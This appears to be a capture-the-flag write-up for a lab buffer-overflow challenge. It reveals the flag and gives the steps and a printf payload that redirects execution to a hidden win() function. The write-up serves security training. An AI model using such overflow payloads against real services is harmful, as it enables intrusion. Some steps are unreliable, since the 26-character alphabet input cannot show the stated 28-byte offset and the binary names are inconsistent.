## PWN-0: System Exploitation
**Description:**
A binary exploitation challenge that involves triggering a buffer overflow to hijack execution flow and call a hidden `win()` function.
<details> <summary><b>Reveal Flag</b></summary> flag{47ea70cf08} </details></br>

**Solution Summary:**
- Discovered a vulnerable C program with no protection mechanisms.
- Identified a classic buffer overflow in the `main()` function.
- Used `objdump` to locate the address of the hidden `win()` function.
- Crafted a payload to overflow the buffer and redirect execution to `win()`.

**Exploitation Steps:**
1. Evaluate the C source file:
   ```bash
   cat /ctf/vulnerable.c
    ```
    Identified a vulnerable `gets()` call in `main()` with no bounds checking.
2. Following the challenge instructions I compiled the binary:
    ```bash
    cd /ctf
    make
    ```
3. Analyze the binary structure using objdump to locate the `win()` function:
    ```bash
    objdump -d ./vulnerable | grep win
    ```
    Output:
    ```plaintext
    080491a5 <win>:
    ```
4. Determine the buffer offset to overwrite the return address:
   - To identify how many bytes were required to reach the return address, I used a crafted input of the full alphabet to trace the overflow point.
     ```bash
     echo "ABCDEFGHIJKLMNOPQRSTUVWXYZ" | ./vulnerable
     ```
   - Then ran the binary inside GDB with verbose logging enabled:
     ```bash
     gdb ./vulnerability
     (gdb) set verbose on
     (gdb) run < input.txt
     ```
   - After the program crashed, I used the following to inspect the value of the instruction pointer (`EIP`) to confirm where in the input it contained the last 4 bytes of the input string.:
     ```bash
     (gdb) info registers
     ```
    - Based on the position of the overwritten instruction pointer within the alphabet string, I calculated that **28 bytes** were required to reach the return address.

5. Construct the exploit payload using the **28 bytes** and the `win()` address (in little indian of course) before testing the exploit against the local copy of `./vunlnerable`
    ```bash
    printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x91\x04\x08" | ./vulnerable
    ```
    Boom..! Success.. we now know that this exploit will achieve the goal of executing the `win()` function that otherwise wouldn't.
    ![img](../images/PWN-0.jpg) 
6. Exploit the buffer overflow against the target server `192.168.1.2` on port `9999` to retrieve the flag.
    ![img](../images/PWN-0a.jpg)
